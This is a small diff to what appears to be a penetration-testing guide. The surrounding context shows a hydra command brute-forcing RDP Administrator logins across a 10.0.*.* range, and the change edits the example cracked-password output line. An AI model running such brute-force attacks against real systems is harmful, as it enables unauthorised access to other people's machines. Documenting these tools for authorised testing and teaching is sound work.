@@ -101,7 +101,7 @@ hydra -l Administrator -P ~/passwords.txt -t 4 -V rdp://10.0.*.*
 ## Example Success Output
 
 ```
-[3389][rdp] host: 10.0.2.6   login: Administrator   password: Password.1!!
+[3389][rdp] host: 10.0.2.6   login: Administrator   password: Password.1**
 ```
 
 ---
